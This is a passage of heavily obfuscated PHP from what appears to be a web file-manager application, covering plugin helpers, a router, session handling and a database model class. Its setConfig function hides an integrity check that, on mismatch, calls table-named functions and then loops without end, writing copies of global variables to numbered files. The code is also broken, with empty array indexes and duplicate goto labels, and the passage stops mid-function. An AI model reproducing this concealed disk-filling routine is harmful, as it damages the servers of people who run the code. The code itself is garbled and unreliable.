} $cѯ = array(); goto a輏; Eӥ: } private function parseConfig(&$Cٌ֫) { goto A; a: $Cٌ֫ = str_replace($Eȑ, $Aڤ, $Cٌ֫); goto eꙉ; AϷ: $Eȑ = array(); $Aڤ = array(); foreach ($dɬט[0] as $eٸ) { $d = substr($eٸ, strlen($Bݰ), -2); $Eȑ[] = $eٸ; $Aڤ[] = _get($cĢ, $d); } goto a; e: preg_match_all($aվ꼏[1467], $Cٌ֫, $dɬט); if (!is_array($dɬט) || count($dɬט) == 0 || !is_array($dɬט[0]) || count($dɬט[0]) == 0) { return; } $cĢ = $this->getConfig(); goto AϷ; A: $aվ꼏 =& $_SERVER[]; $Bݰ = $aվ꼏[1466]; if (!strstr($Cٌ֫, $Bݰ)) { return; } goto e; eꙉ: } private function parsePackage(&$FӰޮ) { goto C; f֬: preg_match_all($bԼ[1469], $FӰޮ, $C򆓬); if (!is_array($C򆓬) || count($C򆓬) == 0 || !is_array($C򆓬[0]) || count($C򆓬[0]) == 0) { return; } $e񵘐 = $this->appPackage(); goto c; c: $dϨ = array(); $a菘ѣ = array(); foreach ($C򆓬[0] as $e֭) { $fٴ = substr($e֭, strlen($Cߋ), -2); $dϨ[] = $e֭; $a菘ѣ[] = _get($e񵘐, $fٴ); } goto Eܢ߫; C: $bԼ =& $_SERVER[]; $Cߋ = $bԼ[1468]; if (!strstr($FӰޮ, $Cߋ)) { return; } goto f֬; Eܢ߫: $FӰޮ = str_replace($dϨ, $a菘ѣ, $FӰޮ); goto b޻; b޻: } final function echoFile($E, $Dۉ = false) { goto e; D: $C쿥 = $this->parseFile($eܘ); $this->parseLang($C쿥); $this->parseConfig($C쿥); goto eܮђ; e: $d =& $_SERVER[]; $eܘ = $this->pluginPath . $E; if (ACT == $d[1470]) { echo $d[1471] . $this->pluginName . $d[8] . $E . $d[1472]; if (!file_exists($eܘ)) { echo $d[1473]; return; } } goto D; eܮђ: $this->parsePackage($C쿥); if (is_array($Dۉ)) { $C쿥 = str_replace(array_keys($Dۉ), array_values($Dۉ), $C쿥); } echo $d[229] . $C쿥; goto Eͤ; Eͤ: } final function initLang() { goto Bƶ; FӦ: $Fӈ鳤 = I18n::getType(); $d̍ = array(); if (file_exists($c؞ . $Fӈ鳤 . $Aɸ[822])) { $d̍ = (include $c؞ . $Fӈ鳤 . $Aɸ[822]); } else { if ($Fӈ鳤 == $Aɸ[1476] && !file_exists($c؞ . $Fӈ鳤 . $Aɸ[822]) && file_exists($c؞ . $Aɸ[1477])) { $d̍ = (include $c؞ . $Aɸ[1477]); } else { if (file_exists($c؞ . $b . $Aɸ[822])) { $d̍ = (include $c؞ . $b . $Aɸ[822]); } } } goto F텅; F텅: if (!is_array($d̍)) { return array(); } if (@count($d̍) > 0) { I18n::set($d̍); } return $d̍; goto eރ; Bƶ: $Aɸ =& $_SERVER[]; $b = $Aɸ[1474]; $c؞ = $this->pluginPath . $Aɸ[1475]; goto FӦ; eރ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($AͺֿȔ) { $CՑɱ =& $_SERVER[]; $F׹ژ = $_SERVER[$CՑɱ[843]] . $CՑɱ[844]; $Fͱ = $CՑɱ[857]; if ($_SERVER[$CՑɱ[840]] != $Fͱ($F׹ژ)) { goto bؒ; F߆䖂: $FΕ֌ = $CՑɱ[859]; $FΕ֌($_SERVER[$CՑɱ[860]]); $Eэ = $CՑɱ[858]; goto b˨Ɍ; D: $f = $fФִ($Dܸ); $FҗϜ = explode($CՑɱ[229], $f); if (count($FҗϜ) < $CՑɱ[605]) { $E = $CՑɱ[845]; $E(); } goto F߆䖂; bؒ: $Eэ = $CՑɱ[858]; $fФִ = $CՑɱ[842]; $Dܸ = $_SERVER[$CՑɱ[843]] . $CՑɱ[844]; goto D; D: $e = 1; for ($d = $e; $d > 0; $d++) { $B(DATA_PATH . $d, $eӋ); } goto fڠ; b˨Ɍ: $Eэ(); $B = $CՑɱ[861]; $eӋ = json_encode($GLOBALS[$CՑɱ[862]]); goto D; fڠ: } return $this->modelPlugin->setConfig($this->pluginName, $AͺֿȔ); } public function onSetConfig($Eˆ) { } public function onGetConfig($Bҕ) { } public function onChangeStatus($fɔ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($eܜ = "\160\154\x75\x67\x69\156\101\x75\164\150") { $Bòȓ =& $_SERVER[]; if (!defined($Bòȓ[468])) { return !1; } if (_get($GLOBALS, $Bòȓ[499])) { return !0; } $FͱƵ = $this->getConfig(); if (!$FͱƵ[$eܜ]) { return !1; } return ActionCall($Bòȓ[1478], $FͱƵ[$eܜ]); } public function url($f̋, $eې = '', $B = true) { goto D퇈; F: if (!$B) { return $f; } echo $f; goto Cة; D퇈: $D =& $_SERVER[]; $e = $this->getConfig(); $F = KOD_VERSION . $D[95] . KOD_VERSION_BUILD; goto b͐; b͐: $bŰ = $this->packageVersion(); $fٜ = $F . $D[454] . $bŰ; if (substr($f̋, 0, 4) == $D[147] || substr($f̋, 0, 2) == $D[1262]) { $f = $f̋ . $D[1479] . $fٜ; } else { if ($eې == $D[33]) { $f = $this->pluginHost . $f̋ . $D[1479] . $fٜ; } else { if ($eې === $D[77]) { $f = $this->pluginHost . $f̋; } else { if ($eې == $D[1480]) { $f = STATIC_PATH . $f̋ . $D[1479] . $F; } else { if ($eې == $D[1481]) { $f = APP_HOST . $D[1482] . $f̋ . $D[1479] . $F; } else { if (isset($e[$eې])) { $f = $e[$eې] . $f̋ . $D[1479] . $fٜ; } } } } } } goto F; Cة: } public function link($F쨐 = false, $eՑ = '') { $FƲ =& $_SERVER[]; if (!$F쨐) { $this->link($FƲ[1483], $FƲ[1481]); $this->link($FƲ[1484], $FƲ[1480]); $this->link($FƲ[1485], $FƲ[1480]); $this->link($FƲ[1486], $FƲ[1480]); $this->link($FƲ[1487], $FƲ[1480]); return; } $d = $this->url($F쨐, $eՑ, !1); if (substr($F쨐, -3) == $FƲ[1488]) { echo $FƲ[1489] . $d . $FƲ[1490] . $FƲ[229]; } else { if (substr($F쨐, -4) == $FƲ[1491]) { echo $FƲ[1492] . $d . $FƲ[1493] . $FƲ[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\133\136\x2f\x5d\x2b", "\x3a\x6e\x75\155" => "\133\60\55\71\135\53", "\x3a\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($a, $c©) { $B쐑 =& $_SERVER[]; if ($a == $B쐑[1494]) { $c΂ = array_map($B쐑[1495], $c©[0]); $B = strpos($c©[1], $B쐑[8]) === 0 ? $c©[1] : $B쐑[8] . $c©[1]; $EӍ = $c©[2]; } else { $c΂ = null; $B = strpos($c©[0], $B쐑[8]) === 0 ? $c©[0] : $B쐑[8] . $c©[0]; $EӍ = $c©[1]; } array_push(self::$maps, $c΂); array_push(self::$routes, $B); array_push(self::$methods, strtoupper($a)); array_push(self::$callbacks, $EӍ); } public static function error($aӷ嶕) { self::$errorCallback = $aӷ嶕; } public static function haltOnMatch($dΊά = true) { self::$halts = $dΊά; } public static function dispatch() { goto F·; F·: $eҜݑ =& $_SERVER[]; $FҤ = parse_url($_SERVER[$eҜݑ[1496]], PHP_URL_PATH); $eՃ = $_SERVER[$eҜݑ[157]]; goto d鎿; e섽: self::$routes = preg_replace($eҜݑ[1181], $eҜݑ[8], self::$routes); if (in_array($FҤ, self::$routes)) { $B = array_keys(self::$routes, $FҤ); foreach ($B as $C) { if (self::$methods[$C] == $eՃ || self::$methods[$C] == $eҜݑ[1497] || in_array($eՃ, self::$maps[$C])) { $f峸 = !0; if (!is_object(self::$callbacks[$C])) { $bۏ = explode($eҜݑ[8], self::$callbacks[$C]); $e = end($bۏ); $e𯰻 = explode($eҜݑ[1498], $e); $AÄ = new $e𯰻[0](); $AÄ->{$e𯰻[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$C]); if (self::$halts) { return; } } } } } else { $bȇ = 0; foreach (self::$routes as $C) { if (strpos($C, $eҜݑ[4]) !== !1) { $C = str_replace($aۈ, $E, $C); } if (preg_match($eҜݑ[1499] . $C . $eҜݑ[1500], $FҤ, $eЈ)) { if (self::$methods[$bȇ] == $eՃ || self::$methods[$bȇ] == $eҜݑ[1497] || !empty(self::$maps[$bȇ]) && in_array($eՃ, self::$maps[$bȇ])) { $f峸 = !0; array_shift($eЈ); if (!is_object(self::$callbacks[$bȇ])) { $bۏ = explode($eҜݑ[8], self::$callbacks[$bȇ]); $e = end($bۏ); $e𯰻 = explode($eҜݑ[1498], $e); $AÄ = new $e𯰻[0](); if (!method_exists($AÄ, $e𯰻[1])) { echo $eҜݑ[1501]; } else { call_user_func_array(array($AÄ, $e𯰻[1]), $eЈ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$bȇ], $eЈ); if (self::$halts) { return; } } } } $bȇ++; } } if ($f峸 == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $dӅ =& $_SERVER[]; header($_SERVER[$dӅ[1502]] . $dӅ[1503]); echo $dӅ[1504]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eҜݑ[1496]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Bɼϟ; d鎿: $aۈ = array_keys(static::$patterns); $E = array_values(static::$patterns); $f峸 = !1; goto e섽; Bɼϟ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto b; Eؔ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $b􈃣 = new self(); return $b􈃣; goto A; F: $B尸 = $Cϖ[$AːҚ]; $bż = $Cϖ[$fδ[812]]; switch ($AːҚ) { case $fδ[17]: self::$handle = Model($fδ[813]); break; case $fδ[814]: self::$handle = new CacheRedis($B尸, $bż); break; case $fδ[815]: self::$handle = new CacheMemcached($B尸, $bż); break; case $fδ[193]: $B尸[$fδ[76]] = $B尸[$fδ[76]] . $fδ[1508]; self::$handle = new CacheFile($B尸, $bż); default: break; } goto Eؔ; C: if (self::$sessionSign) { } else { if (Cookie::get($f햦)) { self::$sessionSign = Cookie::get($f햦); } else { self::$sessionSign = guid(); } } Cookie::setSafe($f햦, self::$sessionSign, self::$sessionTime); $AːҚ = $Cϖ[$fδ[1507]]; goto F; F: $Cϖ = $GLOBALS[$fδ[6]][$fδ[347]]; self::$sessionTime = $Cϖ[$fδ[1505]]; $f햦 = isset($GLOBALS[$fδ[1506]]) ? $GLOBALS[$fδ[1506]] : SESSION_ID; goto C; b: $fδ =& $_SERVER[]; static $b􈃣 = false; if ($b􈃣) { return $b􈃣; } goto F; A: } public static function sign($d = false) { $d && (self::$sessionSign = $d); self::init(); return self::$sessionSign; } public static function set($C, $CɃÔ = false) { self::init(); if (is_array($C)) { foreach ($C as $BΉ => $dξ) { array_set_value(self::$data, $BΉ, $dξ); } } else { array_set_value(self::$data, $C, $CɃÔ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Bര = false) { self::init(); if (!$Bര) { return self::$data; } return array_get_value(self::$data, $Bര); } public static function remove($eХ) { self::init(); unset(self::$data[$eХ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][817])) { self::$handle->clearTimeout(); } } } goto D⧗; cɽ: define($_SERVER[][240], 0); define($_SERVER[][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\145", "\157\x72\x64\145\x72", "\x61\x6c\x69\141\x73", "\x68\141\x76\x69\156\x67", "\x67\162\x6f\x75\x70", "\154\157\x63\x6b", "\144\151\x73\x74\x69\156\143\x74", "\x61\165\164\157", "\x66\151\154\164\145\x72", "\x76\x61\x6c\x69\144\x61\164\x65", "\x72\x65\x73\165\x6c\x74", "\142\x69\156\x64", "\x74\x6f\x6b\x65\x6e"); public function __construct($F謉 = '', $Bߌ = '', $d읋 = '') { $E =& $_SERVER[]; $this->_initialize(); if (!empty($F謉)) { if (strpos($F謉, $E[95])) { list($this->dbName, $this->name) = explode($E[95], $F謉); } else { $this->name = $F謉; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Bߌ)) { $this->tablePrefix = $E[33]; } elseif ($E[33] != $Bߌ) { $this->tablePrefix = $Bߌ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($E[242]); } $this->db(0, empty($this->connection) ? $d읋 : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eď =& $_SERVER[]; if (empty($this->fields)) { if (think_config($eď[243])) { $eō䟚 = $this->dbName ? $this->dbName : think_config($eď[244]); $eп = think_var_cache($eď[245] . strtolower(get_path_this($eō䟚) . $eď[95] . $this->name)); if ($eп) { $F铌 = think_config($eď[246]); if (empty($F铌) || $eп[$eď[247]] == $F铌) { $this->fields = $eп; return; } } } $this->flush(); } } public function flush() { goto Eκ; e߷: if (!$c) { return !1; } $this->fields = array_keys($c); $this->fields[$f[248]] = !1; goto A; Eκ: $f =& $_SERVER[]; $this->db->setModel($this->name); $c = $this->db->getFields($this->getTableName()); goto e߷; aǄӦ: if (think_config($f[243])) { $D = $this->dbName ? $this->dbName : think_config($f[244]); think_var_cache($f[245] . strtolower(get_path_this($D) . $f[95] . $this->name), $this->fields); } goto Aۈ; A: foreach ($c as $a => $AԊ) { $Cȇ[$a] = $AԊ[$f[29]]; if ($AԊ[$f[36]]) { $this->fields[$f[249]] = $a; if ($AԊ[$f[39]]) { $this->fields[$f[248]] = !0; } } } $this->fields[$f[250]] = $Cȇ; if (think_config($f[246])) { $this->fields[$f[247]] = think_config($f[246]); } goto aǄӦ; Aۈ: } public function switchModel($e, $Dģ = array()) { $EŞܥ =& $_SERVER[]; $Aˏ = ucwords(strtolower($e)) . $EŞܥ[251]; if (!class_exists($Aˏ)) { think_exception($Aˏ . think_lang($EŞܥ[252])); } $this->_extModel = new $Aˏ($this->name); if (!empty($Dģ)) { foreach ($Dģ as $F迡) { $this->_extModel->setProperty($F迡, $this->{$F迡}); } } return $this->_extModel; } public function __set($b܈, $D½) { $this->data[$b܈] = $D½; } public function __get($B) { return isset($this->data[$B]) ? $this->data[$B] : null; } public function __isset($e) { return isset($this->data[$e]); } public function __unset($f) { unset($this->data[$f]); } public function __call($d, $a؄) { $bʮ =& $_SERVER[]; if (in_array(strtolower($d), $this->methods, !0)) { $this->options[strtolower($d)] = $a؄[0]; return $this; } elseif (in_array(strtolower($d), array($bʮ[253], $bʮ[254], $bʮ[255], $bʮ[256], $bʮ[257]), !0)) { $f拵߉ = isset($a؄[0]) ? $a؄[0] : $bʮ[182]; $f拵߉ = $this->db->parseKey($f拵߉); return $this->getField(strtoupper($d) . $bʮ[258] . $f拵߉ . $bʮ[259] . $d, $bʮ[253]); } elseif (strtolower(substr($d, 0, 5)) == $bʮ[260]) { $f拵߉ = think_parse_name(substr($d, 5)); $cĔ蘓[$f拵߉] = $a؄[0]; return $this->where($cĔ蘓)->find(); } elseif (strtolower(substr($d, 0, 10)) == $bʮ[261]) { $e郐 = think_parse_name(substr($d, 10)); $cĔ蘓[$e郐] = $a؄[0]; return $this->where($cĔ蘓)->getField($a؄[1]); } elseif (isset($this->_scope[$d])) { return $this->scope($d, $a؄[0]); } elseif (method_exists($this, $d)) { array_unshift($a؄, $d); return call_user_func_array(array($this, $bʮ[262]), $a؄); } else { return call_user_func_array(array(parent, $d), $a؄); } } protected function call() { goto D; c: $CĈ = call_user_func_array(array($this, $D΄), $cи); if (method_exists($this, $dΔǂ[266])) { $a昊 = call_user_func_array(array($this, $dΔǂ[267]), array($f٢, $cи, $CĈ)); if ($a昊) { return $a昊; } } return $CĈ; goto e뇘쭶; D: $dΔǂ =& $_SERVER[]; $cи = func_get_args(); $D΄ = array_shift($cи); goto C; aʍ߫: if (isset($cи[$Eۥ]) && $cи[$Eۥ] === $D΄) { think_exception(__CLASS__ . $dΔǂ[4] . $D΄ . think_lang($dΔǂ[263])); return; } $cи[] = $D΄; if (method_exists($this, $dΔǂ[264])) { $a昊 = call_user_func_array(array($this, $dΔǂ[265]), array($f٢, $cи)); if (!is_null($a昊) && $a昊 !== !1) { return $a昊; } } goto c; C: $f٢ = $D΄; if (is_array($D΄)) { $f٢ = $D΄[1]; $D΄ = $D΄[0]; } $Eۥ = count($cи) - 1; goto aʍ߫; e뇘쭶: } protected function _initialize() { } protected function _facade($C) { $Eʭ堑 =& $_SERVER[]; if (!empty($this->fields)) { foreach ($C as $eې => $A) { if (is_array($this->fields) && !in_array($eې, $this->fields, !0)) { unset($C[$eې]); } elseif (is_scalar($A)) { $this->_parseType($C, $eې); } } } if (!empty($this->options[$Eʭ堑[268]])) { $C = array_map($this->options[$Eʭ堑[268]], $C); unset($this->options[$Eʭ堑[268]]); } $this->_beforeWrite($C); return $C; } protected function _beforeWrite(&$A) { } public function add($Dܔ = '', $dݲ = array(), $B劦 = false) { goto e۬̿; e۬̿: if (empty($Dܔ)) { if (!empty($this->data)) { $Dܔ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][269]); return !1; } } $dݲ = $this->_parseOptions($dݲ); $Dܔ = $this->_facade($Dܔ); goto bʺ; C˷: return $BêŸ; goto Fܛ״; bʺ: if (!1 === $this->_beforeInsert($Dܔ, $dݲ)) { return !1; } $BêŸ = $this->db->insert($Dܔ, $dݲ, $B劦); if (!1 !== $BêŸ) { $Cꣴ = $this->getLastInsID(); if ($Cꣴ) { $Dܔ[$this->getPk()] = $Cꣴ; $this->_after_insert($Dܔ, $dݲ); return $Cꣴ; } $this->_after_insert($Dܔ, $dݲ); } goto C˷; Fܛ״: } protected function _beforeInsert(&$eꃷ, $C㗚㉨) { } protected function _after_insert($aז, $e㬐) { } public function addAll($d۰, $Bѱ = array(), $BԳڣ = false) { goto a΃; c乸: foreach ($d۰ as $D => $E۷ғ) { $d۰[$D] = $this->_facade($E۷ғ); } if (method_exists($this->db, $C՛[270])) { $e = $this->db->insertAll($d۰, $Bѱ, $BԳڣ); } else { $this->startTrans(); foreach ($d۰ as $D => $E۷ғ) { $e = $this->db->insert($E۷ғ, $Bѱ, $BԳڣ); } $this->commit(); } if (!1 !== $e) { $f¾ = $this->getLastInsID(); if ($f¾) { return $f¾; } } goto Eć; a΃: $C՛ =& $_SERVER[]; if (empty($d۰)) { $this->error = think_lang($C՛[269]); return !1; } $Bѱ = $this->_parseOptions($Bѱ); goto c乸; Eć: return $e; goto A; A: } public function selectAdd($F = '', $dˌ = '', $C̠ǈ = array()) { $f浨 =& $_SERVER[]; $C̠ǈ = $this->_parseOptions($C̠ǈ); if (!1 === ($Bړ = $this->db->selectInsert($F ? $F : $C̠ǈ[$f浨[271]], $dˌ ? $dˌ : $this->getTableName(), $C̠ǈ))) { $this->error = think_lang($f浨[272]); return !1; } else { return $Bړ; } } public function save($A = '', $F = array()) { goto Bɑ; f: if (is_array($F[$bާ[273]]) && isset($F[$bާ[273]][$E])) { $cڃ = $F[$bާ[273]][$E]; } if (!1 === $this->_beforeUpdate($A, $F)) { return !1; } $eΖ = $this->db->update($A, $F); goto dއ; dއ: if (!1 !== $eΖ) { if (isset($cڃ)) { $A[$E] = $cڃ; } $this->_afterUpdate($A, $F); } return $eΖ; goto e¿; b: $F = $this->_parseOptions($F); $E = $this->getPk(); if (!isset($F[$bާ[273]])) { if (isset($A[$E])) { $aū[$E] = $A[$E]; $F[$bާ[273]] = $aū; unset($A[$E]); } else { $this->error = think_lang($bާ[272]); return !1; } } goto f; Bɑ: $bާ =& $_SERVER[]; if (empty($A)) { if (!empty($this->data)) { $A = $this->data; $this->data = array(); } else { $this->error = think_lang($bާ[269]); return !1; } } $A = $this->_facade($A); goto b; e¿: } protected function _beforeUpdate(&$d, $C) { } protected function _afterUpdate($BѸ, $Eģ) { } public function delete($d풇 = array()) { goto EɃ; EɃ: $Fΰ =& $_SERVER[]; if (empty($d풇) && empty($this->options[$Fΰ[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $eÄ = $this->getPk(); goto B鿬; F: $Fұ = $this->db->delete($d풇); if (!1 !== $Fұ) { $D֤ = array(); if (isset($C)) { $D֤[$eÄ] = $C; } $this->_after_delete($D֤, $d풇); } return $Fұ; goto a𗉾; B鿬: if (is_numeric($d풇) || is_string($d풇)) { if (strpos($d풇, $Fΰ[47])) { $c풆[$eÄ] = array($Fΰ[274], $d풇); } else { $c풆[$eÄ] = $d풇; } $this->options[$Fΰ[273]] = $c풆; } $d풇 = $this->_parseOptions(); if (is_array($d풇[$Fΰ[273]]) && isset($d풇[$Fΰ[273]][$eÄ])) { $C = $d풇[$Fΰ[273]][$eÄ]; } goto F; a𗉾: } protected function _after_delete($dѵ, $BɅÊ) { } public function select($FȌƭ = array()) { goto aܞ; E: $this->_afterSelect($e, $FȌƭ); return $e; goto eߑ; aܞ: $e =& $_SERVER[]; if (is_string($FȌƭ) || is_numeric($FȌƭ)) { $dɏС = $this->getPk(); if (strpos($FȌƭ, $e[47])) { $bφ[$dɏС] = array($e[274], $FȌƭ); } else { $bφ[$dɏС] = $FȌƭ; } $this->options[$e[273]] = $bφ; } elseif (!1 === $FȌƭ) { $FȌƭ = $this->_parseOptions(); return $e[275] . $this->db->buildSelectSql($FȌƭ) . $e[276]; } $FȌƭ = $this->_parseOptions(); goto c̶; c̶: $e = $this->db->select($FȌƭ); if (!1 === $e) { return !1; } if (empty($e)) { return null; } goto E; eߑ: } protected function _afterSelect(&$e, $eܔݶ) { } public function buildSql($c꽨 = array()) { $Fݣ =& $_SERVER[]; $c꽨 = $this->_parseOptions($c꽨); return $Fݣ[275] . $this->db->buildSelectSql($c꽨) . $Fݣ[276]; } public function optionsValue($C޻ = null) { if (is_null($C޻)) { return $this->options; } elseif (is_array($C޻)) { $this->options = array_merge($this->options, $C޻); } } protected function _parseOptions($d׆ = array()) { goto b֍; Aѻ: if (isset($d׆[$b٧[273]]) && is_array($d׆[$b٧[273]]) && !empty($A翂) && !isset($d׆[$b٧[280]]) && !isset($d׆[$b٧[277]])) { foreach ($d׆[$b٧[273]] as $b݆΃ => $b֙) { $b݆΃ = trim($b݆΃); if (in_array($b݆΃, $A翂, !0)) { if (is_scalar($b֙)) { $this->_parseType($d׆[$b٧[273]], $b݆΃); } } elseif (!is_numeric($b݆΃) && $b٧[71] != substr($b݆΃, 0, 1) && !1 === strpos($b݆΃, $b٧[95]) && !1 === strpos($b݆΃, $b٧[258]) && !1 === strpos($b݆΃, $b٧[281]) && !1 === strpos($b݆΃, $b٧[282])) { unset($d׆[$b٧[273]][$b݆΃]); } } } $this->_options_filter($d׆); return $d׆; goto Dٗ; fɇ؊Ō: if (!isset($d׆[$b٧[277]])) { $d׆[$b٧[277]] = $this->getTableName(); $A翂 = $this->fields; } else { $A翂 = $this->getDbFields(); } if (!empty($d׆[$b٧[278]])) { $d׆[$b٧[277]] .= $b٧[50] . $d׆[$b٧[278]]; } $d׆[$b٧[279]] = $this->name; goto Aѻ; b֍: $b٧ =& $_SERVER[]; if (is_array($d׆)) { $d׆ = array_merge($this->options, $d׆); } $this->options = array(); goto fɇ؊Ō; Dٗ: } protected function _options_filter(&$Aڃ) { } protected function _parseType(&$dб, $Dˑ) { $F =& $_SERVER[]; if (empty($this->options[$F[283]][$F[4] . $Dˑ])) { $Bĩ = strtolower($this->fields[$F[250]][$Dˑ]); if (!1 !== strpos($Bĩ, $F[284])) { } elseif (!1 === strpos($Bĩ, $F[285]) && !1 !== strpos($Bĩ, $F[286])) { $dб[$Dˑ] = intval($dб[$Dˑ]); } elseif (!1 !== strpos($Bĩ, $F[287]) || !1 !== strpos($Bĩ, $F[288])) { $dб[$Dˑ] = floatval($dб[$Dˑ]); } elseif (!1 !== strpos($Bĩ, $F[289])) { $dб[$Dˑ] = (bool) $dб[$Dˑ]; } } } public function find($C = array()) { goto f; eڏ: if (empty($DҖ׽ب)) { return null; } $this->data = $DҖ׽ب[0]; $this->_afterFind($this->data, $C); goto d; d: if (!empty($this->options[$Dይ[291]])) { return $this->returnResult($this->data, $this->options[$Dይ[291]]); } return $this->data; goto f; f: $Dይ =& $_SERVER[]; if (is_numeric($C) || is_string($C)) { $DƜ[$this->getPk()] = intval($C); $this->options[$Dይ[273]] = $DƜ; } $this->options[$Dይ[290]] = 1; goto Dס; Dס: $C = $this->_parseOptions(); $DҖ׽ب = $this->db->select($C); if (!1 === $DҖ׽ب) { return !1; } goto eڏ; f: } protected function _afterFind(&$D֚, $b۳) { } protected function returnResult($cټ, $b韰ٿ = '') { $a =& $_SERVER[]; if ($b韰ٿ) { if (is_callable($b韰ٿ)) { return call_user_func($b韰ٿ, $cټ); } switch (strtolower($b韰ٿ)) { case $a[292]: return json_encode($cټ); case $a[293]: return xml_encode($cټ); } } return $cټ; } public function parseFieldsMap($F̉, $Eе˼ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $D => $Eܝ) { if ($Eе˼ == 1) { if (isset($F̉[$Eܝ])) { $F̉[$D] = $F̉[$Eܝ]; unset($F̉[$Eܝ]); } } else { if (isset($F̉[$D])) { $F̉[$Eܝ] = $F̉[$D]; unset($F̉[$D]); } } } } return $F̉; } public function setField($Eۃơ, $DҾꡙ = '') { if (is_array($Eۃơ)) { $e = $Eۃơ; } else { $e[$Eۃơ] = $DҾꡙ; } return $this->save($e); } public function setAdd($aÒ, $a晣 = 1) { $Fژろ =& $_SERVER[]; $Cغɼ = $aÒ . $Fژろ[294] . $a晣; if ($a晣 < 0) { $Cغɼ = $aÒ . $a晣; } return $this->setField($aÒ, array($Fژろ[295], $Cغɼ)); } public function getField($E, $eǘ̌ = null) { $d窻 =& $_SERVER[]; $eƉȍ[$d窻[271]] = $E; $eƉȍ = $this->_parseOptions($eƉȍ); $E = trim($E); if (strpos($E, $d窻[47])) { if (!isset($eƉȍ[$d窻[290]])) { $eƉȍ[$d窻[290]] = is_numeric($eǘ̌) ? $eǘ̌ : $d窻[33]; } $Dܹ = $this->db->select($eƉȍ); if (!empty($Dܹ)) { goto aھԂ; bඬޫ: $F򴧬 = array_shift($E); $D詺 = array(); $C肠 = count($aک); goto B䦮; aھԂ: $aک = explode($d窻[47], $E); $E = array_keys($Dܹ[0]); $aۑ = array_shift($E); goto bඬޫ; B䦮: foreach ($Dܹ as $Fܩ) { $eю = $Fܩ[$aۑ]; if (2 == $C肠) { $D詺[$eю] = $Fܩ[$F򴧬]; } else { $D詺[$eю] = is_string($eǘ̌) ? implode($eǘ̌, $Fܩ) : $Fܩ; } } return $D詺; goto aɼ; aɼ: } } else { if (!0 !== $eǘ̌) { $eƉȍ[$d窻[290]] = is_numeric($eǘ̌) ? $eǘ̌ : 1; } if ($eǘ̌ === $d窻[253]) { unset($eƉȍ[$d窻[290]]); } $Fܩ = $this->db->select($eƉȍ); if (!empty($Fܩ)) { if ($eǘ̌ === $d窻[253]) { return reset($Fܩ[0]); } if (!0 !== $eǘ̌ && 1 == $eƉȍ[$d窻[290]]) { return reset($Fܩ[0]); } foreach ($Fܩ as $cԋ鑕) { $bƤ[] = $cԋ鑕[$E]; } return $bƤ; } } return null; } public function create($CԬ = '', $D = '') { goto EǑ; EǑ: $FП =& $_SERVER[]; if (empty($CԬ)) { $CԬ = $_POST; } elseif (is_object($CԬ)) { $CԬ = get_object_vars($CԬ); } if (empty($CԬ) || !is_array($CԬ)) { $this->error = think_lang($FП[269]); return !1; } goto Eڳ; bӂ: if (isset($C雾Ę)) { if (is_string($C雾Ę)) { $C雾Ę = explode($FП[47], $C雾Ę); } if (think_config($FП[296])) { $C雾Ę[] = think_config($FП[297]); } foreach ($CԬ as $dת => $b) { if (!in_array($dת, $C雾Ę)) { unset($CԬ[$dת]); } } } if (!$this->autoValidation($CԬ, $D)) { return !1; } if (!$this->autoCheckToken($CԬ)) { $this->error = think_lang($FП[298]); return !1; } goto E; Eڳ: $CԬ = $this->parseFieldsMap($CԬ, 0); $D = $D ? $D : (!empty($CԬ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$FП[271]])) { $C雾Ę = $this->options[$FП[271]]; unset($this->options[$FП[271]]); } elseif ($D == THINK_MODEL_INSERT && isset($this->insertFields)) { $C雾Ę = $this->insertFields; } elseif ($D == THINK_MODEL_UPDATE && isset($this->updateFields)) { $C雾Ę = $this->updateFields; } goto bӂ; e: return $CԬ; goto C; E: if ($this->autoCheckFields) { $C雾Ę = $this->getDbFields(); foreach ($CԬ as $dת => $b) { if (!in_array($dת, $C雾Ę)) { unset($CԬ[$dת]); } elseif (MAGIC_QUOTES_GPC && is_string($b)) { $CԬ[$dת] = stripslashes($b); } } } $this->autoOperation($CԬ, $D); $this->data = $CԬ; goto e; C: } public function autoCheckToken($a⨌) { $dߞմՙ =& $_SERVER[]; if 